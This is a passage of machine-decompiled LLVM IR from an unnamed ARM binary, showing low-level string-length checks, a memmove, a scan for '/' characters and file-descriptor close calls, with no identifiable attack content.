  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a67c = load i32, i32* @r4, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 104, i32* %v2_a67c, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a684:                                ; preds = %dec_label_pc_a188
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* %fp.global-to-local, align 4
  %v2_a688 = inttoptr i32 %v1_a688 to i32*
  store i32 104, i32* %v2_a688, align 4
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6a8, %dec_label_pc_a684
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, -1456
  %v2_a68c = inttoptr i32 %v1_a68c to i32*
  %v3_a68c = load i32, i32* %v2_a68c, align 4
  store i32 %v3_a68c, i32* %r0.global-to-local, align 4
  %v1_a690 = call i32 @close(i32 %v3_a68c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a69c = load i32, i32* @r8, align 4
  %v2_a69c = add i32 %v1_a69c, -1456
  %v3_a69c = inttoptr i32 %v2_a69c to i32*
  store i32 -1, i32* %v3_a69c, align 4
  %v0_a6a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_a6a0 = trunc i32 %v0_a6a0 to i8
  %v2_a6a0 = load i32, i32* @r8, align 4
  %v3_a6a0 = add i32 %v2_a6a0, -1452
  %v4_a6a0 = inttoptr i32 %v3_a6a0 to i8*
  store i8 %v1_a6a0, i8* %v4_a6a0, align 1
  br label %dec_label_pc_9590

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a1b0
  %v0_a6a8 = load i32, i32* %fp.global-to-local, align 4
  %v1_a6a8 = inttoptr i32 %v0_a6a8 to i32*
  %v2_a6a8 = load i32, i32* %v1_a6a8, align 4
  store i32 %v2_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = add i32 %v2_a6a8, -11
  %v2_a6ac = icmp ugt i32 %v2_a6a8, 10
  store i1 %v2_a6ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a6ac = sub i32 10, %v2_a6a8
  %v4_a6ac = and i32 %v3_a6ac, %v2_a6a8
  %v5_a6ac = icmp slt i32 %v4_a6ac, 0
  store i1 %v5_a6ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a6ac = icmp slt i32 %v1_a6ac, 0
  store i1 %v6_a6ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a6ac = icmp eq i32 %v2_a6a8, 11
  store i1 %v7_a6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ac, label %dec_label_pc_9590, label %dec_label_pc_a68c

dec_label_pc_a6b8:                                ; preds = %bb235
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a6c4 = load i32, i32* @r5, align 4
  %v1_a6c4 = add i32 %v0_a6c4, 4
  %v2_a6c4 = inttoptr i32 %v1_a6c4 to i8*
  %v3_a6c4 = load i8, i8* %v2_a6c4, align 1
  %v4_a6c4 = zext i8 %v3_a6c4 to i32
  store i32 %v4_a6c4, i32* %r3.global-to-local, align 4
  %v2_a6c8 = icmp ugt i8 %v3_a6c4, 114
  store i1 %v2_a6c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a6c8 = icmp ult i8 %v3_a6c4, 115
  store i1 %v6_a6c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a6c8 = icmp eq i8 %v3_a6c4, 115
  store i1 %v7_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c8, label %bb240, label %.thread64

bb240:                                            ; preds = %dec_label_pc_a6b8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread64

.thread64:                                        ; preds = %dec_label_pc_a6b8, %bb240
  %v3_a6d8 = phi i32 [ 7, %dec_label_pc_a6b8 ], [ 8, %bb240 ]
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 %v0_a6c4, i32* %r0.global-to-local, align 4
  %v1_a6e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_a6e0 = sub i32 %v1_a6e0, %v3_a6d8
  store i32 %v2_a6e0, i32* %r2.global-to-local, align 4
  %v2_a6e4 = add i32 %v3_a6d8, %v0_a6c4
  store i32 %v2_a6e4, i32* %r1.global-to-local, align 4
  %v3_a6e8 = call i32 @_memmove(i32 %v0_a6c4, i32 %v2_a6e4, i32 %v2_a6e0)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r7, align 4
  store i32 %v0_a6f0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v1_a6f8 = load i32, i32* @r4, align 4
  %v2_a6f8 = add i32 %v1_a6f8, %v2_8fd8
  %v3_a6f8 = inttoptr i32 %v2_a6f8 to i8*
  %v4_a6f8 = load i8, i8* %v3_a6f8, align 1
  %v6_a6f8 = zext i8 %v4_a6f8 to i32
  store i32 %v6_a6f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a6fc = icmp eq i8 %v4_a6f8, 0
  store i1 %v2_a6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6fc, label %dec_label_pc_a740, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %.thread64
  %v2_a704 = icmp ugt i8 %v4_a6f8, 46
  store i1 %v2_a704, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a704 = icmp ult i8 %v4_a6f8, 47
  store i1 %v6_a704, i1* %cpsr_n.global-to-local, align 1
  %v7_a704 = icmp eq i8 %v4_a6f8, 47
  store i1 %v7_a704, i1* %cpsr_z.global-to-local, align 1
  %v1_a708 = load i32, i32* @r5, align 4
  br i1 %v7_a704, label %bb241, label %dec_label_pc_a710

bb241:                                            ; preds = %dec_label_pc_a704
  store i32 %v1_a708, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a8a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a720

dec_label_pc_a718:                                ; preds = %dec_label_pc_a720
  %v2_a718 = icmp ugt i8 %v4_a72c, 46
  store i1 %v2_a718, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a718 = icmp ult i8 %v4_a72c, 47
  store i1 %v6_a718, i1* %cpsr_n.global-to-local, align 1
  %v7_a718 = icmp eq i8 %v4_a72c, 47
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_a8a0, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a710
  %v0_a734 = phi i32 [ %v1_a734, %dec_label_pc_a718 ], [ 1, %dec_label_pc_a710 ]
  store i32 %v0_a734, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v0_a734, i32* %stack_var_-40, align 4
  %v2_a72c = add i32 %v0_a734, %v1_a708
  %v3_a72c = inttoptr i32 %v2_a72c to i8*
  %v4_a72c = load i8, i8* %v3_a72c, align 1
  %v6_a72c = zext i8 %v4_a72c to i32
  store i32 %v6_a72c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a730 = icmp eq i8 %v4_a72c, 0
  store i1 %v2_a730, i1* %cpsr_z.global-to-local, align 1
  %v1_a734 = add i32 %v0_a734, 1
  store i32 %v1_a734, i32* %r3.global-to-local, align 4
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  br i1 %v2_a730, label %dec_label_pc_a740, label %dec_label_pc_a718

dec_label_pc_a740:                                ; preds = %dec_label_pc_a720, %.thread64, %dec_label_pc_a8a0
  %v0_a740 = load i32, i32* @r5, align 4
  store i32 %v0_a740, i32* %r0.global-to-local, align 4
  %v1_a744 = inttoptr i32 %v0_a740 to i8*
  %v2_a744 = call i32 @function_1399c(i8* %v1_a744)
  store i32 %v2_a744, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a748 = icmp slt i32 %v2_a744, 0
  store i1 %v1_a748, i1* %cpsr_n.global-to-local, align 1
  %v2_a748 = icmp eq i32 %v2_a744, 0
  store i1 %v2_a748, i1* %cpsr_z.global-to-local, align 1
  %tmp242 = icmp slt i32 %v2_a744, 1
  br i1 %tmp242, label %dec_label_pc_a76c, label %dec_label_pc_a750

dec_label_pc_a750:                                ; preds = %dec_label_pc_a740
  %v0_a750 = load i32, i32* @r5, align 4
  store i32 %v0_a750, i32* %r0.global-to-local, align 4
  %v1_a754 = inttoptr i32 %v0_a750 to i8*
  %v2_a754 = call i32 @function_1399c(i8* %v1_a754)
  store i32 %v2_a754, i32* %r0.global-to-local, align 4
  %v1_a758 = add i32 %v2_a754, -127
  %v2_a758 = icmp ugt i32 %v2_a754, 126
  store i1 %v2_a758, i1* %cpsr_c.global-to-local, align 1
  %v3_a758 = sub i32 126, %v2_a754
  %v4_a758 = and i32 %v3_a758, %v2_a754
  %v5_a758 = icmp slt i32 %v4_a758, 0
  store i1 %v5_a758, i1* %cpsr_v.global-to-local, align 1
  %v6_a758 = icmp slt i32 %v1_a758, 0
  store i1 %v6_a758, i1* %cpsr_n.global-to-local, align 1
  %v7_a758 = icmp eq i32 %v2_a754, 127
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  %v7_a75c = icmp sgt i32 %v2_a754, 127
  br i1 %v7_a75c, label %.thread67, label %bb243

bb243:                                            ; preds = %dec_label_pc_a750
  %v8_a75c = load i32, i32* %sb.global-to-local, align 4
  %v9_a760 = add i32 %v8_a75c, 789
  store i32 %v9_a760, i32* %r0.global-to-local, align 4
  %v8_a764 = load i32, i32* @r5, align 4
  store i32 %v8_a764, i32* %r1.global-to-local, align 4
  br label %.thread67

.thread67:                                        ; preds = %dec_label_pc_a750, %bb243
  store i32 42860, i32* %lr.global-to-local, align 4
  %v3_a768 = xor i1 %v6_a758, %v5_a758
  %v4_a768 = or i1 %v7_a758, %v3_a768
  call void @__pseudo_cond_branch(i1 %v4_a768, i32 ptrtoint (i32* @global_var_139c4.103 to i32))
  br label %dec_label_pc_a76c

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a740, %.thread67
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a770 = load i32, i32* %stack_var_-40, align 4
  %v0_a774 = load i32, i32* @r5, align 4
  %v2_a774 = add i32 %v3_a770, 1
  %v1_a778 = add i32 %v2_a774, %v0_a774
  store i32 %v1_a778, i32* %r0.global-to-local, align 4
  %v1_a77c = inttoptr i32 %v1_a778 to i8*
  %v2_a77c = call i32 @function_1399c(i8* %v1_a77c)
  store i32 %v2_a77c, i32* %r0.global-to-local, align 4
  %v1_a780 = add i32 %v2_a77c, -255
  %v2_a780 = icmp ugt i32 %v2_a77c, 254
  store i1 %v2_a780, i1* %cpsr_c.global-to-local, align 1
  %v3_a780 = sub i32 254, %v2_a77c
  %v4_a780 = and i32 %v3_a780, %v2_a77c
  %v5_a780 = icmp slt i32 %v4_a780, 0
  store i1 %v5_a780, i1* %cpsr_v.global-to-local, align 1
  %v6_a780 = icmp slt i32 %v1_a780, 0
  store i1 %v6_a780, i1* %cpsr_n.global-to-local, align 1
  %v7_a780 = icmp eq i32 %v2_a77c, 255
  store i1 %v7_a780, i1* %cpsr_z.global-to-local, align 1
  %v8_a784 = icmp sgt i32 %v2_a77c, 255
  br i1 %v8_a784, label %dec_label_pc_a158, label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a76c
  %v0_a788 = load i32, i32* %sb.global-to-local, align 4
  %v1_a78c = add i32 %v0_a788, 533
  store i32 %v1_a78c, i32* @r4, align 4
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a798 = call i32 @function_13a3c(i32 %v1_a78c, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a7a0 = load i32, i32* %stack_var_-40, align 4
  %v0_a7a4 = load i32, i32* @r5, align 4
  %v2_a7a4 = add i32 %v3_a7a0, 1
  %v1_a7a8 = add i32 %v2_a7a4, %v0_a7a4
  store i32 %v1_a7a8, i32* %r0.global-to-local, align 4
  %v1_a7ac = inttoptr i32 %v1_a7a8 to i8*
  %v2_a7ac = call i32 @function_1399c(i8* %v1_a7ac)
  store i32 %v2_a7ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a7b0 = icmp slt i32 %v2_a7ac, 0
  store i1 %v1_a7b0, i1* %cpsr_n.global-to-local, align 1
  %v2_a7b0 = icmp eq i32 %v2_a7ac, 0
  store i1 %v2_a7b0, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_a7ac, 1
  br i1 %tmp244, label %dec_label_pc_a158, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a788
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a7bc = load i32, i32* %stack_var_-40, align 4
  %v0_a7c0 = load i32, i32* @r5, align 4
  %v0_a7c4 = load i32, i32* @r4, align 4
  store i32 %v0_a7c4, i32* @r0, align 4
  %v2_a7c0 = add i32 %v3_a7bc, 1
  %v1_a7c8 = add i32 %v2_a7c0, %v0_a7c0
  store i32 %v1_a7c8, i32* %r1.global-to-local, align 4
  %v2_a7cc = inttoptr i32 %v0_a7c4 to i8*
  %v3_a7cc = call i32 @function_139c4(i8* %v2_a7cc, i32 %v1_a7c8)
  store i32 %v3_a7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_9b28
  %v0_a7d4 = load i32, i32* @r8, align 4
  %v1_a7d4 = add i32 %v0_a7d4, -1456
  %v2_a7d4 = inttoptr i32 %v1_a7d4 to i32*
  %v3_a7d4 = load i32, i32* %v2_a7d4, align 4
  store i32 %v3_a7d4, i32* %r0.global-to-local, align 4
  %v1_a7d8 = call i32 @close(i32 %v3_a7d4)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a7e4 = load i32, i32* @r8, align 4
  %v2_a7e4 = add i32 %v1_a7e4, -1456
  %v3_a7e4 = inttoptr i32 %v2_a7e4 to i32*
  store i32 -1, i32* %v3_a7e4, align 4
  %v0_a7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7e8 = trunc i32 %v0_a7e8 to i8
  %v2_a7e8 = load i32, i32* @r8, align 4
  %v3_a7e8 = add i32 %v2_a7e8, -1452
  %v4_a7e8 = inttoptr i32 %v3_a7e8 to i8*
  store i8 %v1_a7e8, i8* %v4_a7e8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_a3a8
  %v0_a7f0 = load i32, i32* @r8, align 4
  %v1_a7f0 = add i32 %v0_a7f0, -1452
  %v2_a7f0 = inttoptr i32 %v1_a7f0 to i8*
  %v3_a7f0 = load i8, i8* %v2_a7f0, align 1
  %v4_a7f0 = zext i8 %v3_a7f0 to i32
  store i32 %v4_a7f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a7f4 = icmp eq i8 %v3_a7f0, 0
  store i1 %v2_a7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a7f4, label %dec_label_pc_9590, label %dec_label_pc_a158

dec_label_pc_a800:                                ; preds = %dec_label_pc_a618
  %v0_a800 = load i32, i32* @r4, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32), i32* %r1.global-to-local, align 4
  %v2_a808 = inttoptr i32 %v0_a800 to i8*
  %v3_a808 = call i32 @function_13d7c(i8* %v2_a808, i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32))
  store i32 %v3_a808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a80c = icmp slt i32 %v3_a808, 0
  store i1 %v1_a80c, i1* %cpsr_n.global-to-local, align 1
  %v2_a80c = icmp eq i32 %v3_a808, 0
  store i1 %v2_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a80c, label %bb245, label %dec_label_pc_a64c

bb245:                                            ; preds = %dec_label_pc_a800
  %v0_a814 = load i32, i32* %fp.global-to-local, align 4
  %v1_a814 = load i32, i32* @r5, align 4
  %v2_a814 = sub i32 %v0_a814, %v1_a814
  %v3_a814 = icmp uge i32 %v0_a814, %v1_a814
  store i1 %v3_a814, i1* %cpsr_c.global-to-local, align 1
  %v4_a814 = xor i32 %v1_a814, %v0_a814
  %v5_a814 = xor i32 %v2_a814, %v0_a814
  %v6_a814 = and i32 %v5_a814, %v4_a814
  %v7_a814 = icmp slt i32 %v6_a814, 0
  store i1 %v7_a814, i1* %cpsr_v.global-to-local, align 1
  %v8_a814 = icmp slt i32 %v2_a814, 0
  store i1 %v8_a814, i1* %cpsr_n.global-to-local, align 1
  %v9_a814 = icmp eq i32 %v0_a814, %v1_a814
  store i1 %v9_a814, i1* %cpsr_z.global-to-local, align 1
  %v7_a818 = icmp sgt i32 %v0_a814, %v1_a814
  %. = select i1 %v7_a818, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a820 = trunc i32 %. to i8
  %v10_a820 = load i32, i32* @r8, align 4
  %v11_a820 = add i32 %v10_a820, -1452
  %v12_a820 = inttoptr i32 %v11_a820 to i8*
  store i8 %v9_a820, i8* %v12_a820, align 1
  br label %dec_label_pc_a654

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a2a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_a834 = load i32, i32* @r8, align 4
  %v1_a834 = add i32 %v0_a834, 656
  %v2_a834 = inttoptr i32 %v1_a834 to i32*
  %v3_a834 = load i32, i32* %v2_a834, align 4
  store i32 %v3_a834, i32* @r4, align 4
  %v3_a838 = call i32 @function_12f90(i32 36, i32* null)
  %v0_a83c = load i32, i32* @r4, align 4
  store i32 %v0_a83c, i32* %r1.global-to-local, align 4
  store i32 %v3_a838, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a848 = load i32, i32* @r7, align 4
  store i32 %v0_a848, i32* %r0.global-to-local, align 4
  %v4_a84c = call i32 @function_13a60(i32 %v0_a848, i32 %v0_a83c, i32 %v3_a838, i32 11)
  store i32 %v4_a84c, i32* %r0.global-to-local, align 4
  %v0_a850 = load i32, i32* @r8, align 4
  %v1_a850 = add i32 %v0_a850, 656
  %v2_a850 = inttoptr i32 %v1_a850 to i32*
  %v3_a850 = load i32, i32* %v2_a850, align 4
  %v0_a854 = load i32, i32* @r7, align 4
  %v2_a854 = add i32 %v0_a854, %v4_a84c
  store i32 %v2_a854, i32* @r5, align 4
  store i32 %v4_a84c, i32* @r4, align 4
  %v2_a85c = sub i32 %v3_a850, %v4_a84c
  store i32 %v2_a85c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14338.105 to i32), i32* %r2.global-to-local, align 4
  %v0_a864 = load i32, i32* @sl, align 4
  store i32 %v0_a864, i32* %r3.global-to-local, align 4
  store i32 %v2_a854, i32* %r0.global-to-local, align 4
  %v4_a86c = call i32 @function_13a60(i32 %v2_a854, i32 %v2_a85c, i32 ptrtoint (i32* @global_var_14338.105 to i32), i32 %v0_a864)
  store i32 %v4_a86c, i32* %r0.global-to-local, align 4
  %v0_a870 = load i32, i32* @r8, align 4
  %v1_a870 = add i32 %v0_a870, 12
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  %v2_a874 = add i32 %v0_a874, %v4_a86c
  store i32 %v2_a874, i32* %r6.global-to-local, align 4
  %v1_a878 = load i32, i32* %sb.global-to-local, align 4
  %v2_a878 = add i32 %v1_a878, %v2_a874
  store i32 %v2_a878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_a880 = add i32 %v3_a870, -4
  %v2_a880 = icmp ugt i32 %v3_a870, 3
  store i1 %v2_a880, i1* %cpsr_c.global-to-local, align 1
  %v3_a880 = sub i32 3, %v3_a870
  %v4_a880 = and i32 %v3_a880, %v3_a870
  %v5_a880 = icmp slt i32 %v4_a880, 0
  store i1 %v5_a880, i1* %cpsr_v.global-to-local, align 1
  %v6_a880 = icmp slt i32 %v1_a880, 0
  store i1 %v6_a880, i1* %cpsr_n.global-to-local, align 1
  %v7_a880 = icmp eq i32 %v3_a870, 4
  store i1 %v7_a880, i1* %cpsr_z.global-to-local, align 1
  %v3_a884 = add i32 %v2_a878, 2115
  %v4_a884 = inttoptr i32 %v3_a884 to i8*
  store i8 0, i8* %v4_a884, align 1
  %v7_a888 = icmp sgt i32 %v3_a870, 4
  br i1 %v7_a888, label %dec_label_pc_a88c, label %dec_label_pc_a914

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a82c, %dec_label_pc_a914, %dec_label_pc_a924
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a894 = load i32, i32* @r8, align 4
  %v2_a894 = add i32 %v1_a894, 8
  %v3_a894 = inttoptr i32 %v2_a894 to i32*
  store i32 -1, i32* %v3_a894, align 4
  %v0_a898 = load i32, i32* %r3.global-to-local, align 4
  %v1_a898 = trunc i32 %v0_a898 to i8
  %v2_a898 = load i32, i32* @r8, align 4
  %v3_a898 = add i32 %v2_a898, -1452
  %v4_a898 = inttoptr i32 %v3_a898 to i8*
  store i8 %v1_a898, i8* %v4_a898, align 1
  br label %dec_label_pc_9590

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a718, %bb241
  %v2_a8a4 = phi i32 [ %v1_a708, %bb241 ], [ %v2_a72c, %dec_label_pc_a718 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a8a4 = inttoptr i32 %v2_a8a4 to i8*
  store i8 0, i8* %v3_a8a4, align 1
  br label %dec_label_pc_a740

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a148
  %v0_a8ac = load i32, i32* %sb.global-to-local, align 4
  %v1_a8b0 = add i32 %v0_a8ac, 533
  store i32 %v1_a8b0, i32* @r4, align 4
  store i32 %v1_a8b0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a8bc = call i32 @function_13a3c(i32 %v1_a8b0, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a8c4 = load i32, i32* %stack_var_-40, align 4
  %v0_a8c8 = load i32, i32* @r5, align 4
  %v2_a8c8 = add i32 %v3_a8c4, 1
  %v1_a8cc = add i32 %v2_a8c8, %v0_a8c8
  store i32 %v1_a8cc, i32* %r0.global-to-local, align 4
  %v1_a8d0 = inttoptr i32 %v1_a8cc to i8*
  %v2_a8d0 = call i32 @function_1399c(i8* %v1_a8d0)
  store i32 %v2_a8d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a8d4 = icmp slt i32 %v2_a8d0, 0
  store i1 %v1_a8d4, i1* %cpsr_n.global-to-local, align 1
  %v2_a8d4 = icmp eq i32 %v2_a8d0, 0
  store i1 %v2_a8d4, i1* %cpsr_z.global-to-local, align 1
  %tmp246 = icmp slt i32 %v2_a8d0, 1
  br i1 %tmp246, label %dec_label_pc_a158, label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8ac
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a8e0 = load i32, i32* %stack_var_-40, align 4
  %v0_a8e4 = load i32, i32* @r5, align 4
  %v2_a8e4 = add i32 %v3_a8e0, 1
  %v1_a8e8 = add i32 %v2_a8e4, %v0_a8e4
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v1_a8ec = inttoptr i32 %v1_a8e8 to i8*
  %v2_a8ec = call i32 @function_1399c(i8* %v1_a8ec)
  store i32 %v2_a8ec, i32* %r0.global-to-local, align 4
  %v1_a8f0 = add i32 %v2_a8ec, -255
  %v2_a8f0 = icmp ugt i32 %v2_a8ec, 254
  store i1 %v2_a8f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a8f0 = sub i32 254, %v2_a8ec
  %v4_a8f0 = and i32 %v3_a8f0, %v2_a8ec
  %v5_a8f0 = icmp slt i32 %v4_a8f0, 0
  store i1 %v5_a8f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a8f0 = icmp slt i32 %v1_a8f0, 0
  store i1 %v6_a8f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a8f0 = icmp eq i32 %v2_a8ec, 255
  store i1 %v7_a8f0, i1* %cpsr_z.global-to-local, align 1
  %v8_a8f4 = icmp sgt i32 %v2_a8ec, 255
  br i1 %v8_a8f4, label %dec_label_pc_a158, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8dc
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a8fc = load i32, i32* %stack_var_-40, align 4
  %v0_a900 = load i32, i32* @r5, align 4
  %v0_a904 = load i32, i32* @r4, align 4
  store i32 %v0_a904, i32* @r0, align 4
  %v2_a900 = add i32 %v3_a8fc, 1
  %v1_a908 = add i32 %v2_a900, %v0_a900
  store i32 %v1_a908, i32* %r1.global-to-local, align 4
  %v2_a90c = inttoptr i32 %v0_a904 to i8*
  %v3_a90c = call i32 @function_139c4(i8* %v2_a90c, i32 %v1_a908)
  store i32 %v3_a90c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a914:                                ; preds = %dec_label_pc_a82c
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r0.global-to-local, align 4
  %v1_a918 = inttoptr i32 %v0_a914 to i8*
  %v2_a918 = call i32 @function_1399c(i8* %v1_a918)
  store i32 %v2_a918, i32* %r0.global-to-local, align 4
  %v1_a91c = add i32 %v2_a918, -127
  %v2_a91c = icmp ugt i32 %v2_a918, 126
  store i1 %v2_a91c, i1* %cpsr_c.global-to-local, align 1
  %v3_a91c = sub i32 126, %v2_a918
  %v4_a91c = and i32 %v3_a91c, %v2_a918
  %v5_a91c = icmp slt i32 %v4_a91c, 0
  store i1 %v5_a91c, i1* %cpsr_v.global-to-local, align 1
  %v6_a91c = icmp slt i32 %v1_a91c, 0
  store i1 %v6_a91c, i1* %cpsr_n.global-to-local, align 1
  %v7_a91c = icmp eq i32 %v2_a918, 127
  store i1 %v7_a91c, i1* %cpsr_z.global-to-local, align 1
  %v8_a920 = icmp sgt i32 %v2_a918, 127
  br i1 %v8_a920, label %dec_label_pc_a88c, label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a914
  %v0_a924 = load i32, i32* @r8, align 4
  %v1_a924 = add i32 %v0_a924, 12
  %v2_a924 = inttoptr i32 %v1_a924 to i32*
  %v3_a924 = load i32, i32* %v2_a924, align 4
  store i32 %v1_a168, i32* %r2.global-to-local, align 4
  %v1_a92c = and i32 %v3_a924, 33554432
  %v2_a92c = icmp ne i32 %v1_a92c, 0
  store i1 %v2_a92c, i1* %cpsr_c.global-to-local, align 1
  %v3_a92c = mul i32 %v3_a924, 128
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  %v2_a934 = add i32 %v3_a92c, %v1_a168
  store i32 %v2_a934, i32* @r0, align 4
  %v2_a938 = inttoptr i32 %v2_a934 to i8*
  %v3_a938 = call i32 @function_139c4(i8* %v2_a938, i32 %v0_a930)
  store i32 %v3_a938, i32* %r0.global-to-local, align 4
  %v0_a93c = load i32, i32* @r8, align 4
  %v1_a93c = add i32 %v0_a93c, 12
  %v2_a93c = inttoptr i32 %v1_a93c to i32*
  %v3_a93c = load i32, i32* %v2_a93c, align 4
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v1_a944 = and i32 %v3_a93c, 33554432
  %v2_a944 = icmp ne i32 %v1_a944, 0
  store i1 %v2_a944, i1* %cpsr_c.global-to-local, align 1
  %v3_a944 = mul i32 %v3_a93c, 128
  %v2_a948 = add i32 %v3_a944, %v1_a168
  store i32 %v2_a948, i32* %r4.global-to-local, align 4
  store i32 %v2_a948, i32* %r0.global-to-local, align 4
  %v1_a950 = inttoptr i32 %v2_a948 to i8*
  %v2_a950 = call i32 @function_1399c(i8* %v1_a950)
